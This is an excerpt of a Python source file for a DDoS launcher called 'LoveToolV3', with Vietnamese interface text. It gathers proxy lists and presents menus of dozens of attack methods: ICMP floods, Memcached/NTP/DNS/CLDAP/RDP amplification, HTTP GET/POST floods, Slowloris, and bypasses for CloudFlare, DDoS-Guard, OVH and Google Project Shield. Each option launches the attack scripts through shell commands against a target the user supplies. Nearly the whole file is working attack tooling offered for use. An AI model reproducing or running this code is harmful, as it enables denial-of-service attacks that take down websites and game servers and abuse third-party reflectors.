			...
			for proxies in http_proxies:
				try:
					if httpx.get(proxies).status_code == 200:
						print(Color.LG+f"[{200}] Thành Công")
						with open(file_name, 'a') as p:
							p.write(httpx.get(proxies).text)
					else:
						print(Color.LR+f"[{httpx.get(proxies).status_code}] Lỗi!!")
				except:
...
""")
		...
		while True:
			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"LoveToolV3"+Color.LB+" @ "+Color.LG+"DDoS"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
			option = input()
			if option in ['layer4', 'LAYER4']:
				os.system('clear');self.l4()
			elif option in ['layer7', 'LAYER7']:
...
""")
		...
		print(Color.LR+"["+Color.LG+"06"+Color.LR+"]"+Color.LC+" CPS : Open and close connections with proxy")
		print(Color.LR+"["+Color.LG+"07"+Color.LR+"]"+Color.LC+" ICMP : Icmp echo request flood (Layer3)")
		print(Color.LR+"["+Color.LG+"08"+Color.LR+"]"+Color.LC+" CONNECTION : Open connection alive with proxy")
		print(Color.LR+"["+Color.LG+"09"+Color.LR+"]"+Color.LC+" TS3 : Send Teamspeak 3 Status Ping Protocol")
		print(Color.LR+"["+Color.LG+"10"+Color.LR+"]"+Color.LC+" FIVEM : Send Fivem Status Ping Protocol")
		print(Color.LR+"["+Color.LG+"11"+Color.LR+"]"+Color.LC+" MEM : Memcached Amplification")
		print(Color.LR+"["+Color.LG+"12"+Color.LR+"]"+Color.LC+" NTP : NTP Amplification")
		print(Color.LR+"["+Color.LG+"13"+Color.LR+"]"+Color.LC+" MCBOT : Minecraft Bot Attack")
		print(Color.LR+"["+Color.LG+"14"+Color.LR+"]"+Color.LC+" MINECRAFT : Minecraft Status Ping Protocol")
		print(Color.LR+"["+Color.LG+"15"+Color.LR+"]"+Color.LC+" MCPE : Minecraft PE Status Ping Protocol")
		print(Color.LR+"["+Color.LG+"16"+Color.LR+"]"+Color.LC+" DNS : DNS Amplification")
		print(Color.LR+"["+Color.LG+"17"+Color.LR+"]"+Color.LC+" CHAR : Chargen Amplification")
		print(Color.LR+"["+Color.LG+"18"+Color.LR+"]"+Color.LC+" CLDAP : Cldap Amplification")
		print(Color.LR+"["+Color.LG+"19"+Color.LR+"]"+Color.LC+" ARD : Apple Remote Desktop Amplification")
		print(Color.LR+"["+Color.LG+"20"+Color.LR+"]"+Color.LC+" RDP : Remote Desktop Protocol Amplification")
		...
		while True:
			...
			if option in ['01', '1']:
				...
				try:
					...
					floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} 🚀 Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 vdh/start.py CPS {ip}:{port} {floodtime} {thread}'], shell=True)
				...
				try:
					...
					floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} 🚀 Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 vdh/start.py ICMP {ip}:{port} {floodtime} {thread}'], shell=True)
				...
				try:
					...
					floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} 🚀 Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 vdh/start.py CONNECTION {ip}:{port} {floodtime} {thread}'], shell=True)
				...
				try:
					...
					floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} 🚀 Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 vdh/start.py TS3 {ip}:{port} {floodtime} {thread}'], shell=True)
				...
				try:
					...
					floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} 🚀 Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 vdh/start.py FIVEM {ip}:{port} {floodtime} {thread}'], shell=True)
				...
				try:
					...
					floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} 🚀 Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 vdh/start.py MEM {ip}:{port} {floodtime} {thread}'], shell=True)
				...
				try:
					...
					floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} 🚀 Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 vdh/start.py NTP {ip}:{port} {floodtime} {thread}'], shell=True)
				...
				try:
					...
					floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} 🚀 Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 vdh/start.py MCBOT {ip}:{port} {floodtime} {thread}'], shell=True)
				...
				try:
					...
					floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} 🚀 Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 vdh/start.py MINECRAFT {ip}:{port} {floodtime} {thread}'], shell=True)
				...
				try:
					...
					floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} 🚀 Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 vdh/start.py MCPE {ip}:{port} {floodtime} {thread}'], shell=True)
				...
				try:
					...
					floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} 🚀 Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 vdh/start.py DNS {ip}:{port} {floodtime} {thread}'], shell=True)
				...
				try:
					...
					floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} 🚀 Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 vdh/start.py CHAR {ip}:{port} {floodtime} {thread}'], shell=True)
				...
				try:
					...
					floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} 🚀 Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 vdh/start.py CLDAP {ip}:{port} {floodtime} {thread}'], shell=True)
				...
				try:
					...
					floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} 🚀 Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 vdh/start.py ARD {ip}:{port} {floodtime} {thread}'], shell=True)
				...
				try:
					...
					floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
					thread = int(input(f"{Color.LG} 🚀 Thread: "+Color.RESET))
					subprocess.run([f'screen -dm python3 vdh/start.py RPD {ip}:{port} {floodtime} {thread}'], shell=True)
...
""")
		...
		print(Color.LR+"["+Color.LG+"06"+Color.LR+"]"+Color.LC+" GET | GET Flood")
		print(Color.LR+"["+Color.LG+"07"+Color.LR+"]"+Color.LC+" POST | POST Flood")
		print(Color.LR+"["+Color.LG+"08"+Color.LR+"]"+Color.LC+" OVH | Bypass OVH")
		print(Color.LR+"["+Color.LG+"09"+Color.LR+"]"+Color.LC+" RHEX | Random HEX")
		print(Color.LR+"["+Color.LG+"10"+Color.LR+"]"+Color.LC+" STOMP | Bypass chk_captcha")
		print(Color.LR+"["+Color.LG+"11"+Color.LR+"]"+Color.LC+" STRESS | Send HTTP Packet With High Byte")
		print(Color.LR+"["+Color.LG+"12"+Color.LR+"]"+Color.LC+" DYN | A New Method With Random SubDomain")
		print(Color.LR+"["+Color.LG+"13"+Color.LR+"]"+Color.LC+" DOWNLOADER | A New Method of Reading data slowly")
		print(Color.LR+"["+Color.LG+"14"+Color.LR+"]"+Color.LC+" SLOW | Slowloris Old Method of DDoS")
		print(Color.LR+"["+Color.LG+"15"+Color.LR+"]"+Color.LC+" HEAD | https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/HEAD")
		print(Color.LR+"["+Color.LG+"16"+Color.LR+"]"+Color.LC+" NULL | Null UserAgent and ...")
		print(Color.LR+"["+Color.LG+"17"+Color.LR+"]"+Color.LC+" COOKIE | Random Cookie PHP 'if (isset($_COOKIE))'")
		print(Color.LR+"["+Color.LG+"18"+Color.LR+"]"+Color.LC+" PPS | Only 'GET / HTTP/1.1")
		print(Color.LR+"["+Color.LG+"19"+Color.LR+"]"+Color.LC+" EVEN | GET Method with more header")
		print(Color.LR+"["+Color.LG+"20"+Color.LR+"]"+Color.LC+" GSB | Google Project Shield Bypass")
		print(Color.LR+"["+Color.LG+"21"+Color.LR+"]"+Color.LC+" DGB | DDoS Guard Bypass")
		print(Color.LR+"["+Color.LG+"22"+Color.LR+"]"+Color.LC+" AVB | Arvan Cloud Bypass")
		print(Color.LR+"["+Color.LG+"23"+Color.LR+"]"+Color.LC+" BOT | Like Google bot")
		print(Color.LR+"["+Color.LG+"24"+Color.LR+"]"+Color.LC+" APACHE | Apache Expliot")
		print(Color.LR+"["+Color.LG+"25"+Color.LR+"]"+Color.LC+" XMLRPC | WP XMLRPC expliot (add /xmlrpc.php)")
		print(Color.LR+"["+Color.LG+"26"+Color.LR+"]"+Color.LC+" CFBUAM | CloudFlare Under Attack Mode Bypass")
		print(Color.LR+"["+Color.LG+"27"+Color.LR+"]"+Color.LC+" CFB | CloudFlare Bypass")
		print(Color.LR+"["+Color.LG+"28"+Color.LR+"]"+Color.LC+" BYPASS | Bypass Normal AntiDDoS")
		print(Color.LR+"["+Color.LG+"28"+Color.LR+"]"+Color.LC+" BOMB | Bypass with codesenberg/bombardier")
		print(Color.LR+"["+Color.LG+"29"+Color.LR+"]"+Color.LC+" KILLER | run many threads to kill a target")
		print(Color.LR+"["+Color.LG+"30"+Color.LR+"]"+Color.LC+" TOR | Bypass onion website")
		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Return")
		print("\n")
		while True:
			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"LoveToolV3"+Color.LB+" @ "+Color.LG+"DDoS"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
							VDH_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/socket1 {url} utils/http.txt {floodtime} 200'], shell=True);subprocess.run([f'screen -dm node utils/L7/socket2 {url} {floodtime}'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
							VDH_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/http1 GET {url} utils/http.txt {floodtime} 64 1'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
							VDH_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/http2 {url} {floodtime}'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
							VDH_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/cfkill {url} {floodtime} 1'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
							VDH_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/cringeV2 {url} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							VDH_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py GET {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							VDH_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py POST {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							VDH_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py OVH {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							VDH_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py RHEX {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							VDH_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py STOMP {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							VDH_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py STRESS {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							VDH_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py DYN {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							VDH_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py DOWNLOADER {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							VDH_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py SLOW {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							VDH_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py HEAD {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							VDH_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py NULL {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							VDH_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py COOKIE {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							VDH_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py PPS {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							VDH_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py EVEN {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							VDH_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py GSB {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							VDH_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py DGB {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							VDH_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py AVB {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							VDH_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py BOT {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							VDH_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py APACHE {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							VDH_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py XMLRPC {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							VDH_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py CFBUAM {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							VDH_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py BYPASS {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							VDH_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py BOMB {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							VDH_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py KILLER {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
				...
				try:
					...
					if url in '':
						...
						if urlparse(url).scheme in '':
							...
							threads = int(input(f"{Color.LG} 🚀 threads: "+Color.RESET))
							rpc = int(input(f"{Color.LG} 🚀 rpc: "+Color.RESET))
							VDH_Tool.getproxies();subprocess.run([f'screen -dm python3 vdh/start.py TOR {url} {socks} {threads} proxy.txt {rpc} {floodtime} 2'], shell=True)
...
if __name__ == '__main__':
	commands = f"""{Color.LC}layer7 Hoặc LAYER7{Color.LR} -> {Color.LY} Để Vào Layer7 
{Color.LC}layer4 Hoặc LAYER4{Color.LR} -> {Color.LY} Để Vào Layer7 
{Color.LC}HOME{Color.LR} -> {Color.LY} Trở Lại Home
{Color.LC}STOP{Color.LR} -> {Color.LY} Ngừng DDoS
{Color.LG}DEV{Color.LR} -> {Color.LB}ContactDev"""
	dev = f"""{Color.LC}Telegram{Color.LR}: {Color.LY} @viduchung06\nFacebook {Color.LR}:{Color.LY} @viduchung.06\nYoutube{Color.LR}:{Color.LY} Vi Đức Hùng"""
	VDH_Tool = Home(commands, dev)
	try:open('abc.py');main()
	except:quit()
